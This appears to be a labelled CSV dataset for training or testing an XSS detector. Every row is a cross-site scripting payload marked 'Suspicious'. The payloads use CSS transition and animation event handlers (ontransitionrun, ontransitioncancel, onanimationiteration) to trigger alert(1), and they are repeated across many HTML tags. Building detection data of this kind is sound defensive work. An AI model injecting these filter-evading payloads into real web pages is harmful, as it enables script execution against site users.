WebString,Label
"<style>:target {transform: rotate(180deg);}</style><track id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></track>",Suspicious
"<style>:target {transform: rotate(180deg);}</style><tt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tt>",Suspicious
"<style>:target {transform: rotate(180deg);}</style><u id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></u>",Suspicious
"<style>:target {transform: rotate(180deg);}</style><ul id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></ul>",Suspicious
"<style>:target {transform: rotate(180deg);}</style><var id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></var>",Suspicious
"<style>:target {transform: rotate(180deg);}</style><video id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></video>",Suspicious
"<style>:target {transform: rotate(180deg);}</style><wbr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></wbr>",Suspicious
"<style>:target {transform: rotate(180deg);}</style><xmp id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></xmp>",Suspicious
"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 10s"" ontransitioncancel=alert(1)></xss>",Suspicious
"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></xss>",Suspicious
"<style>@keyframes slidein {}</style><a style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></a>",Suspicious
"<style>@keyframes slidein {}</style><abbr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></abbr>",Suspicious
"<style>@keyframes slidein {}</style><acronym style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></acronym>",Suspicious
"<style>@keyframes slidein {}</style><address style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></address>",Suspicious
"<style>@keyframes slidein {}</style><applet style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></applet>",Suspicious
"<style>@keyframes slidein {}</style><area style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></area>",Suspicious
"<style>@keyframes slidein {}</style><article style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></article>",Suspicious
"<style>@keyframes slidein {}</style><aside style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></aside>",Suspicious
"<style>@keyframes slidein {}</style><audio style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></audio>",Suspicious
"<style>@keyframes slidein {}</style><b style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></b>",Suspicious
"<style>@keyframes slidein {}</style><base style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></base>",Suspicious
"<style>@keyframes slidein {}</style><basefont style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></basefont>",Suspicious
"<style>@keyframes slidein {}</style><bdi style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></bdi>",Suspicious
"<style>@keyframes slidein {}</style><bdo style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></bdo>",Suspicious
"<style>@keyframes slidein {}</style><bgsound style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></bgsound>",Suspicious
"<style>@keyframes slidein {}</style><big style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></big>",Suspicious
"<style>@keyframes slidein {}</style><blink style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></blink>",Suspicious
"<style>@keyframes slidein {}</style><blockquote style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></blockquote>",Suspicious
"<style>@keyframes slidein {}</style><body style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></body>",Suspicious
"<style>@keyframes slidein {}</style><br style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></br>",Suspicious
"<style>@keyframes slidein {}</style><button style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></button>",Suspicious
"<style>@keyframes slidein {}</style><canvas style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></canvas>",Suspicious
"<style>@keyframes slidein {}</style><caption style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></caption>",Suspicious
"<style>@keyframes slidein {}</style><center style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></center>",Suspicious
"<style>@keyframes slidein {}</style><cite style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></cite>",Suspicious
"<style>@keyframes slidein {}</style><code style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></code>",Suspicious
"<style>@keyframes slidein {}</style><col style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></col>",Suspicious
"<style>@keyframes slidein {}</style><colgroup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></colgroup>",Suspicious
"<style>@keyframes slidein {}</style><command style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></command>",Suspicious
"<style>@keyframes slidein {}</style><content style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></content>",Suspicious
"<style>@keyframes slidein {}</style><data style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></data>",Suspicious
"<style>@keyframes slidein {}</style><datalist style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></datalist>",Suspicious
"<style>@keyframes slidein {}</style><dd style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dd>",Suspicious
"<style>@keyframes slidein {}</style><del style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></del>",Suspicious
"<style>@keyframes slidein {}</style><details style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></details>",Suspicious
"<style>@keyframes slidein {}</style><dfn style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dfn>",Suspicious
"<style>@keyframes slidein {}</style><dialog style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dialog>",Suspicious
"<style>@keyframes slidein {}</style><dir style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dir>",Suspicious
"<style>@keyframes slidein {}</style><div style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></div>",Suspicious
"<style>@keyframes slidein {}</style><dl style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dl>",Suspicious
"<style>@keyframes slidein {}</style><dt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dt>",Suspicious
"<style>@keyframes slidein {}</style><element style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></element>",Suspicious
"<style>@keyframes slidein {}</style><em style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></em>",Suspicious
"<style>@keyframes slidein {}</style><embed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></embed>",Suspicious
"<style>@keyframes slidein {}</style><fieldset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></fieldset>",Suspicious
"<style>@keyframes slidein {}</style><figcaption style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></figcaption>",Suspicious
"<style>@keyframes slidein {}</style><figure style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></figure>",Suspicious
"<style>@keyframes slidein {}</style><font style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></font>",Suspicious
"<style>@keyframes slidein {}</style><footer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></footer>",Suspicious
"<style>@keyframes slidein {}</style><form style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></form>",Suspicious
"<style>@keyframes slidein {}</style><frame style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></frame>",Suspicious
"<style>@keyframes slidein {}</style><frameset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></frameset>",Suspicious
"<style>@keyframes slidein {}</style><h1 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></h1>",Suspicious
"<style>@keyframes slidein {}</style><head style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></head>",Suspicious
"<style>@keyframes slidein {}</style><header style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></header>",Suspicious
"<style>@keyframes slidein {}</style><hgroup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></hgroup>",Suspicious
"<style>@keyframes slidein {}</style><hr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></hr>",Suspicious
"<style>@keyframes slidein {}</style><html style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></html>",Suspicious
"<style>@keyframes slidein {}</style><i style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></i>",Suspicious
"<style>@keyframes slidein {}</style><iframe style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></iframe>",Suspicious
"<style>@keyframes slidein {}</style><image style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></image>",Suspicious
"<style>@keyframes slidein {}</style><img style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></img>",Suspicious
"<style>@keyframes slidein {}</style><input style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></input>",Suspicious
"<style>@keyframes slidein {}</style><ins style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ins>",Suspicious
"<style>@keyframes slidein {}</style><isindex style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></isindex>",Suspicious
"<style>@keyframes slidein {}</style><kbd style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></kbd>",Suspicious
"<style>@keyframes slidein {}</style><keygen style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></keygen>",Suspicious
